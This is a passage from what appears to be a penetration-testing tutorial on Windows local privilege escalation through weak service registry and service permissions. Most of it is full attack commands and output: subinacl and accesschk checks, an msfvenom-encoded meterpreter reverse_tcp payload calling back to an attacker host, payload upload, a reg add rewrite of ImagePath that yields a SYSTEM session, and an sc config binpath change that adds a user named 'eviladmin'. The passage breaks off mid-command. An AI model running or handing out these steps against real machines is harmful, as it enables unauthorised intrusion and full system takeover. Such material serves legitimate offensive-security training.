C:\Users\testuser\AppData\Local\Temp&gt;</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="">meterpreter &gt; shell</span></li><li class=" even"><span class="">Process </span><span class="nu0">2196</span><span class=""> created.</span></li><li class=" odd"><span class="">Channel </span><span class="nu0">3</span><span class=""> created.</span></li><li class=" even"><span class="">Microsoft Windows </span><span class="br0">[</span><span class="">Version </span><span class="nu0">6.3</span><span class="nu0">.9600</span><span class="br0">]</span><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">(</span><span class="">c</span><span class="br0">)</span><span class=""> </span><span class="nu0">2013</span><span class=""> Microsoft Corporation. All rights reserved.</span></li><li class=" even"><span class=""></span></li><li class="specialline odd"><span class="">C:\Users\testuser\AppData\Local\Temp&gt;subinacl.exe /keyreg </span><span class="st0">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service"</span><span class=""> /display</span></li><li class=" even"><span class="">subinacl.exe /keyreg </span><span class="st0">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service"</span><span class=""> /display</span></li><li class=" odd"><span class="">SeSecurityPrivilege : Access is denied.</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">WARNING :Unable to set SeSecurityPrivilege privilege. This privilege may be required. </span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">================================================================================</span></li><li class=" even"><span class="">+KeyReg HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service</span></li><li class=" odd"><span class="">================================================================================</span></li><li class=" even"><span class="">/control=</span><span class="nu0">0x400</span><span class=""> SE_DACL_AUTO_INHERITED-</span><span class="nu0">0x0400</span><span class=""> </span></li><li class=" odd"><span class="">/owner             =builtin\administrators</span></li><li class=" even"><span class="">/primary group     =system</span></li><li class=" odd"><span class="">/perm. ace count   =</span><span class="nu0">10</span><span class=""></span></li><li class="specialline even"><span class="">/pace =everyone   ACCESS_ALLOWED_ACE_TYPE-</span><span class="nu0">0x0</span><span class=""></span></li><li class="specialline odd"><span class="">  CONTAINER_INHERIT_ACE-</span><span class="nu0">0x2</span><span class="">      </span></li><li class="specialline even"><span class="">    Key and SubKey - Type of Access:</span></li><li class="specialline odd"><span class="">  Full Control</span></li><li class=" even"><span class="">    Detailed Access Flags :</span></li><li class=" odd"><span class="">  KEY_QUERY_VALUE-</span><span class="nu0">0x1</span><span class="">        KEY_SET_VALUE-</span><span class="nu0">0x2</span><span class="">          KEY_CREATE_SUB_KEY-</span><span class="nu0">0x4</span><span class="">     </span></li><li class=" even"><span class="">  KEY_ENUMERATE_SUB_KEYS-</span><span class="nu0">0x8</span><span class=""> KEY_NOTIFY-</span><span class="nu0">0x10</span><span class="">            KEY_CREATE_LINK-</span><span class="nu0">0x20</span><span class="">       DELETE-</span><span class="nu0">0x10000</span><span class="">             </span></li><li class=" odd"><span class="">  READ_CONTROL-</span><span class="nu0">0x20000</span><span class="">       WRITE_DAC-</span><span class="nu0">0x40000</span><span class="">          WRITE_OWNER-</span><span class="nu0">0x80000</span><span class="">        </span></li><li class=" even"><span class="">.</span></li><li class=" odd"><span class="">.</span></li><li class=" even"><span class="">.</span></li><li class=" odd"><span class="">.</span></li><li class=" even"><span class="">.</span></li><li class=" odd"><span class="">.</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">C:\Users\testuser\AppData\Local\Temp&gt;</span></li></ol><pre style="display: none;">meterpreter &gt; shell
Process 2196 created.
Channel 3 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\testuser\AppData\Local\Temp&gt;subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /display
subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /display
SeSecurityPrivilege : Access is denied.

WARNING :Unable to set SeSecurityPrivilege privilege. This privilege may be required. 

================================================================================
+KeyReg HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service
================================================================================
/control=0x400 SE_DACL_AUTO_INHERITED-0x0400 
/owner             =builtin\administrators
/primary group     =system
/perm. ace count   =10
/pace =everyone 	ACCESS_ALLOWED_ACE_TYPE-0x0
  CONTAINER_INHERIT_ACE-0x2      
    Key and SubKey - Type of Access:
  Full Control
    Detailed Access Flags :
  KEY_QUERY_VALUE-0x1        KEY_SET_VALUE-0x2          KEY_CREATE_SUB_KEY-0x4     
  KEY_ENUMERATE_SUB_KEYS-0x8 KEY_NOTIFY-0x10            KEY_CREATE_LINK-0x20       DELETE-0x10000             
  READ_CONTROL-0x20000       WRITE_DAC-0x40000          WRITE_OWNER-0x80000        
.
.
.
.
.
.


C:\Users\testuser\AppData\Local\Temp&gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>Focus on 20th to 23rd lines. It says <em>Everyone</em> has <em>Full Control</em> on this registry key. It means we can change the executable path of this service by editing the <em>ImagePath</em>&nbsp;value. It’s a huge security weakness.</p>
<p>If we generate a simple reverse shell payload and drop it to our target,&nbsp;all that remains is changing the <em>ImagePath</em> value for our vulnerable service with our payload’s path.</p>
<p>Let’s generate a simple reverse shell payload:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="1" style="display: none;">root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 360 (iteration=0)
x86/shikata_ga_nai chosen with final size 360
Payload size: 360 bytes
Final size of exe file: 73802 bytes
Saved as: Payload.exe</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">root@kali:~</span><span class="co1"># msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe</span><span class=""></span></li><li class=" even"><span class="">No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span></li><li class=" odd"><span class="">No Arch selected, selecting Arch: x86 from the payload</span></li><li class=" even"><span class="">Found </span><span class="nu0">1</span><span class=""> compatible encoders</span></li><li class=" odd"><span class="">Attempting to encode payload with </span><span class="nu0">1</span><span class=""> iterations of x86/shikata_ga_nai</span></li><li class=" even"><span class="">x86/shikata_ga_nai succeeded with size </span><span class="kw1">360</span><span class=""> </span><span class="br0">(</span><span class="">iteration=</span><span class="nu0">0</span><span class="br0">)</span><span class=""></span></li><li class=" odd"><span class="">x86/shikata_ga_nai chosen with final size </span><span class="nu0">360</span><span class=""></span></li><li class=" even"><span class="">Payload size: </span><span class="nu0">360</span><span class=""> bytes</span></li><li class=" odd"><span class="">Final size of exe file: </span><span class="nu0">73802</span><span class=""> bytes</span></li><li class=" even"><span class="">Saved as: Payload.exe</span></li></ol><pre style="display: none;">root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 360 (iteration=0)
x86/shikata_ga_nai chosen with final size 360
Payload size: 360 bytes
Final size of exe file: 73802 bytes
Saved as: Payload.exe</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>Drop it to target machine:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="1,3" style="display: none;">meterpreter &gt; pwd
C:\Users\testuser\AppData\Local\Temp
meterpreter &gt; upload -f Payload.exe
[*] uploading  : Payload.exe -&gt; Payload.exe
[*] uploaded   : Payload.exe -&gt; Payload.exe
meterpreter &gt;</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">meterpreter &gt; pwd</span></li><li class=" even"><span class="">C:\Users\testuser\AppData\Local\Temp</span></li><li class="specialline odd"><span class="">meterpreter &gt; upload -f Payload.exe</span></li><li class=" even"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> uploading  : Payload.exe -&gt; Payload.exe</span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> uploaded   : Payload.exe -&gt; Payload.exe</span></li><li class=" even"><span class="">meterpreter &gt;</span></li></ol><pre style="display: none;">meterpreter &gt; pwd
C:\Users\testuser\AppData\Local\Temp
meterpreter &gt; upload -f Payload.exe
[*] uploading  : Payload.exe -&gt; Payload.exe
[*] uploaded   : Payload.exe -&gt; Payload.exe
meterpreter &gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>Now let’s change the&nbsp;<em>ImagePath</em> value with our payload’s path.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="7" style="display: none;">meterpreter &gt; shell
Process 280 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\testuser\AppData\Local\Temp&gt;reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\testuser\AppData\Local\Temp\Payload.exe" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\testuser\AppData\Local\Temp\Payload.exe" /f
The operation completed successfully.

C:\Users\testuser\AppData\Local\Temp&gt;
</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="">meterpreter &gt; shell</span></li><li class=" even"><span class="">Process </span><span class="nu0">280</span><span class=""> created.</span></li><li class=" odd"><span class="">Channel </span><span class="nu0">1</span><span class=""> created.</span></li><li class=" even"><span class="">Microsoft Windows </span><span class="br0">[</span><span class="">Version </span><span class="nu0">6.3</span><span class="nu0">.9600</span><span class="br0">]</span><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">(</span><span class="">c</span><span class="br0">)</span><span class=""> </span><span class="nu0">2013</span><span class=""> Microsoft Corporation. All rights reserved.</span></li><li class=" even"><span class=""></span></li><li class="specialline odd"><span class="">C:\Users\testuser\AppData\Local\Temp&gt;reg add </span><span class="st0">"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service"</span><span class=""> /t REG_EXPAND_SZ /v ImagePath /d </span><span class="st0">"C:\Users\testuser\AppData\Local\Temp\Payload.exe"</span><span class=""> /f</span></li><li class=" even"><span class="">reg add </span><span class="st0">"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service"</span><span class=""> /t REG_EXPAND_SZ /v ImagePath /d </span><span class="st0">"C:\Users\testuser\AppData\Local\Temp\Payload.exe"</span><span class=""> /f</span></li><li class=" odd"><span class="">The operation completed successfully.</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">C:\Users\testuser\AppData\Local\Temp&gt;</span></li></ol><pre style="display: none;">meterpreter &gt; shell
Process 280 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\testuser\AppData\Local\Temp&gt;reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\testuser\AppData\Local\Temp\Payload.exe" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\testuser\AppData\Local\Temp\Payload.exe" /f
The operation completed successfully.

C:\Users\testuser\AppData\Local\Temp&gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>At the next start of the service, <em>Payload.exe </em>will run as SYSTEM.&nbsp;But remember, we had to restart the computer to do this.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="1" style="display: none;">C:\Users\testuser\AppData\Local\Temp&gt;shutdown /r /t 0
shutdown /r /t 0

C:\Users\testuser\AppData\Local\Temp&gt;
[*] 192.168.2.6 - Meterpreter session 1 closed.  Reason: Died</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">C:\Users\testuser\AppData\Local\Temp&gt;shutdown /r /t </span><span class="nu0">0</span><span class=""></span></li><li class=" even"><span class="">shutdown /r /t </span><span class="nu0">0</span><span class=""></span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">C:\Users\testuser\AppData\Local\Temp&gt;</span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.6</span><span class=""> - Meterpreter session </span><span class="nu0">1</span><span class=""> closed.  Reason: Died</span></li></ol><pre style="display: none;">C:\Users\testuser\AppData\Local\Temp&gt;shutdown /r /t 0
shutdown /r /t 0

C:\Users\testuser\AppData\Local\Temp&gt;
[*] 192.168.2.6 - Meterpreter session 1 closed.  Reason: Died</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>Our target machine is restarting now. Prepare your handler! Soon, our payload will work as SYSTEM.</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="8-11" style="display: none;">msf exploit(handler) &gt; run

[*] Started reverse TCP handler on 192.168.2.60:8989 
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.2.6
[*] Meterpreter session 2 opened (192.168.2.60:8989 -&gt; 192.168.2.6:49156) at 2017-01-16 03:59:58 -0500

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter &gt; 
[*] 192.168.2.6 - Meterpreter session 2 closed.  Reason: Died
</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="">msf </span><span class="kw1">exploit</span><span class="br0">(</span><span class="">handler</span><span class="br0">)</span><span class=""> &gt; run</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> Started reverse TCP handler on </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.60</span><span class="">:</span><span class="nu0">8989</span><span class=""> </span></li><li class=" even"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> Starting the payload handler...</span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> Sending </span><span class="kw1">stage</span><span class=""> </span><span class="br0">(</span><span class="nu0">957999</span><span class=""> bytes</span><span class="br0">)</span><span class=""> to </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.6</span><span class=""></span></li><li class=" even"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> Meterpreter session </span><span class="nu0">2</span><span class=""> </span><span class="kw1">opened</span><span class=""> </span><span class="br0">(</span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.60</span><span class="">:</span><span class="nu0">8989</span><span class=""> -&gt; </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.6</span><span class="">:</span><span class="nu0">49156</span><span class="br0">)</span><span class=""> at </span><span class="nu0">2017</span><span class="">-</span><span class="nu0">01</span><span class="">-</span><span class="nu0">16</span><span class=""> </span><span class="nu0">03</span><span class="">:</span><span class="nu0">59</span><span class="">:</span><span class="nu0">58</span><span class=""> -</span><span class="nu0">0500</span><span class=""></span></li><li class=" odd"><span class=""></span></li><li class="specialline even"><span class="">meterpreter &gt; getuid</span></li><li class="specialline odd"><span class="">Server username: NT AUTHORITY\SYSTEM</span></li><li class="specialline even"><span class="">meterpreter &gt; </span></li><li class="specialline odd"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.6</span><span class=""> - Meterpreter session </span><span class="nu0">2</span><span class=""> closed.  Reason: Died</span></li></ol><pre style="display: none;">msf exploit(handler) &gt; run

[*] Started reverse TCP handler on 192.168.2.60:8989 
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.2.6
[*] Meterpreter session 2 opened (192.168.2.60:8989 -&gt; 192.168.2.6:49156) at 2017-01-16 03:59:58 -0500

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter &gt; 
[*] 192.168.2.6 - Meterpreter session 2 closed.  Reason: Died</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>But don’t forget! We are working with services just as in the previous method our hi-priv meterpreter session will die quickly.</p>
<h4>Insecure Service&nbsp;Permissions</h4>
<p>It&nbsp;is very similar to previous Insecure Registry&nbsp;Permissions example. Instead of changing service’s “ImagePath” registry value directly we will do it with modifying service properties.</p>
<p>To check&nbsp;which Services have vulnerable privileges we can use&nbsp;<a href="https://technet.microsoft.com/en-us/sysinternals/accesschk.aspx">AccessChk</a> tool from&nbsp;<a href="https://technet.microsoft.com/en-us/sysinternals/bb842062.aspx">SysInternals Suite</a>.</p>
<p>Upload AccessChk tool to target machine:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1,2,4" style="display: none;">meterpreter &gt; cd %temp%
meterpreter &gt; pwd
C:\Users\testuser\AppData\Local\Temp
meterpreter &gt; upload -f accesschk.exe
[*] uploading  : accesschk.exe -&gt; accesschk.exe
[*] uploaded   : accesschk.exe -&gt; accesschk.exe
meterpreter &gt;</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">meterpreter &gt; cd %temp%</span></li><li class="specialline even"><span class="">meterpreter &gt; pwd</span></li><li class=" odd"><span class="">C:\Users\testuser\AppData\Local\Temp</span></li><li class="specialline even"><span class="">meterpreter &gt; upload -f accesschk.exe</span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> uploading  : accesschk.exe -&gt; accesschk.exe</span></li><li class=" even"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> uploaded   : accesschk.exe -&gt; accesschk.exe</span></li><li class=" odd"><span class="">meterpreter &gt;</span></li></ol><pre style="display: none;">meterpreter &gt; cd %temp%
meterpreter &gt; pwd
C:\Users\testuser\AppData\Local\Temp
meterpreter &gt; upload -f accesschk.exe
[*] uploading  : accesschk.exe -&gt; accesschk.exe
[*] uploaded   : accesschk.exe -&gt; accesschk.exe
meterpreter &gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>To check vulnerable services simply run this command:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="9" style="display: none;">meterpreter &gt; getuid
Server username: TARGETMACHINE\testuser
meterpreter &gt; shell
Process 3496 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\testuser\AppData\Local\Temp&gt;accesschk.exe -uwcqv "testuser" * 
accesschk.exe -uwcqv "TestUser" *

Accesschk v6.02 - Reports effective permissions for securable objects
Copyright (C) 2006-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

RW Vulnerable Service
 SERVICE_ALL_ACCESS

C:\Users\testuser\AppData\Local\Temp&gt;

</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="">meterpreter &gt; getuid</span></li><li class=" even"><span class="">Server username: TARGETMACHINE\testuser</span></li><li class=" odd"><span class="">meterpreter &gt; shell</span></li><li class=" even"><span class="">Process </span><span class="nu0">3496</span><span class=""> created.</span></li><li class=" odd"><span class="">Channel </span><span class="nu0">2</span><span class=""> created.</span></li><li class=" even"><span class="">Microsoft Windows </span><span class="br0">[</span><span class="">Version </span><span class="nu0">6.3</span><span class="nu0">.9600</span><span class="br0">]</span><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">(</span><span class="">c</span><span class="br0">)</span><span class=""> </span><span class="nu0">2013</span><span class=""> Microsoft Corporation. All rights reserved.</span></li><li class=" even"><span class=""></span></li><li class="specialline odd"><span class="">C:\Users\testuser\AppData\Local\Temp&gt;accesschk.exe -uwcqv </span><span class="st0">"testuser"</span><span class=""> * </span></li><li class=" even"><span class="">accesschk.exe -uwcqv </span><span class="st0">"TestUser"</span><span class=""> *</span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">Accesschk v6</span><span class="nu0">.02</span><span class=""> - Reports effective permissions for securable objects</span></li><li class=" odd"><span class=""></span><span class="kw1">Copyright</span><span class=""> </span><span class="br0">(</span><span class="">C</span><span class="br0">)</span><span class=""> </span><span class="nu0">2006</span><span class="">-</span><span class="nu0">2016</span><span class=""> Mark Russinovich</span></li><li class=" even"><span class="">Sysinternals - www.sysinternals.com</span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">RW Vulnerable Service</span></li><li class=" odd"><span class=""> SERVICE_ALL_ACCESS</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">C:\Users\testuser\AppData\Local\Temp&gt;</span></li></ol><pre style="display: none;">meterpreter &gt; getuid
Server username: TARGETMACHINE\testuser
meterpreter &gt; shell
Process 3496 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\testuser\AppData\Local\Temp&gt;accesschk.exe -uwcqv "testuser" * 
accesschk.exe -uwcqv "TestUser" *

Accesschk v6.02 - Reports effective permissions for securable objects
Copyright (C) 2006-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

RW Vulnerable Service
 SERVICE_ALL_ACCESS

C:\Users\testuser\AppData\Local\Temp&gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>All services that “testuser” can modify will be listed.&nbsp;<em>SERVICE_ALL_ACCESS</em> means we have full control over modifying the properties of&nbsp;Vulnerable Service.</p>
<p>Let’s view&nbsp;the properties of the Vulnerable&nbsp;Service:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1" style="display: none;">C:\Users\testuser\AppData\Local\Temp&gt;sc qc "Vulnerable Service"
sc qc "Vulnerable Service"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Vulnerable Service
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
        LOAD_ORDER_GROUP   : UIGroup
        TAG                : 0
        DISPLAY_NAME       : Vulnerable Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

C:\Users\testuser\AppData\Local\Temp&gt;</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">C:\Users\testuser\AppData\Local\Temp&gt;sc qc </span><span class="st0">"Vulnerable Service"</span><span class=""></span></li><li class=" even"><span class="">sc qc </span><span class="st0">"Vulnerable Service"</span><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">SC</span><span class="br0">]</span><span class=""> QueryServiceConfig SUCCESS</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">SERVICE_NAME: Vulnerable Service</span></li><li class=" even"><span class="">        TYPE               : </span><span class="nu0">10</span><span class="">  WIN32_OWN_PROCESS </span></li><li class=" odd"><span class="">        START_TYPE         : </span><span class="nu0">2</span><span class="">   AUTO_START</span></li><li class=" even"><span class="">        ERROR_CONTROL      : </span><span class="nu0">1</span><span class="">   NORMAL</span></li><li class=" odd"><span class="">        BINARY_PATH_NAME   : C:\Program </span><span class="kw1">Files</span><span class=""> </span><span class="br0">(</span><span class="">x86</span><span class="br0">)</span><span class="">\Program Folder\A Subfolder\Executable.exe</span></li><li class=" even"><span class="">        LOAD_ORDER_GROUP   : UIGroup</span></li><li class=" odd"><span class="">        TAG                : </span><span class="nu0">0</span><span class=""></span></li><li class=" even"><span class="">        DISPLAY_NAME       : Vulnerable Service</span></li><li class=" odd"><span class="">        DEPENDENCIES       : </span></li><li class=" even"><span class="">        SERVICE_START_NAME : LocalSystem</span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">C:\Users\testuser\AppData\Local\Temp&gt;</span></li></ol><pre style="display: none;">C:\Users\testuser\AppData\Local\Temp&gt;sc qc "Vulnerable Service"
sc qc "Vulnerable Service"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Vulnerable Service
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
        LOAD_ORDER_GROUP   : UIGroup
        TAG                : 0
        DISPLAY_NAME       : Vulnerable Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

C:\Users\testuser\AppData\Local\Temp&gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>BINARY_PATH_NAME points to Executable.exe which is executable file for this service. If we change this value with any command means this command will run as SYSTEM at the next start of the service.&nbsp;We can add a local admin if we want.</p>
<p>The first thing to do is adding a user:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null" style="display: none;">C:\Users\testuser\AppData\Local\Temp&gt;sc config "Vulnerable Service" binpath= "net user eviladmin P4ssw0rd@ /add"
sc config "Vulnerable Service" binpath= "net user eviladmin P4ssw0rd@ /add"
[SC] ChangeServiceConfig SUCCESS

C:\Users\testuser\AppData\Local\Temp&gt;</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="">C:\Users\testuser\AppData\Local\Temp&gt;sc config </span><span class="st0">"Vulnerable Service"</span><span class=""> binpath= </span><span class="st0">"net user eviladmin P4ssw0rd@ /add"</span><span class=""></span></li><li class=" even"><span class="">sc config </span><span class="st0">"Vulnerable Service"</span><span class=""> binpath= </span><span class="st0">"net user eviladmin P4ssw0rd@ /add"</span><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">SC</span><span class="br0">]</span><span class=""> ChangeServiceConfig SUCCESS</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">C:\Users\testuser\AppData\Local\Temp&gt;</span></li></ol><pre style="display: none;">C:\Users\testuser\AppData\Local\Temp&gt;sc config "Vulnerable Service" binpath= "net user eviladmin P4ssw0rd@ /add"
sc config "Vulnerable Service" binpath= "net user eviladmin P4ssw0rd@ /add"
[SC] ChangeServiceConfig SUCCESS

C:\Users\testuser\AppData\Local\Temp&gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>After changing binpath, restart service with “sc stop” and “sc start” commands:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1,13" style="display: none;">C:\Users\testuser\AppData\Local\Temp&gt;sc stop "Vulnerable Service"
sc stop "Vulnerable Service"

SERVICE_NAME: Vulnerable Service 
